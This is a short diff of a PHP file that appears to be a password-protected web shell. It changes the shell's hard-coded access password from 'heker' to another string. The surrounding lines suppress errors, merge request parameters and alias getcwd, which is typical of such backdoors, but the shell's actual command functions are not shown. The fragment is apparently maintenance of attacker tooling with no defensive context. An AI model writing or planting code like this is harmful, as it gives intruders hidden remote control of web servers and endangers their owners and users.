@@ -14,7 +14,7 @@ error_reporting(0);
 	$_7 = array_merge($_POST, $_GET);
 	$_r = "required='required'";
 	$gcw = "getcwd";
-	$correctPassword = "heker"; //Change Password
+	$correctPassword = "zxcasdqwe321"; //Change Password
 	if (isset($_POST['pass'])) {
 		$enteredPassword = $_POST['pass'];
 		if ($enteredPassword === $correctPassword) {
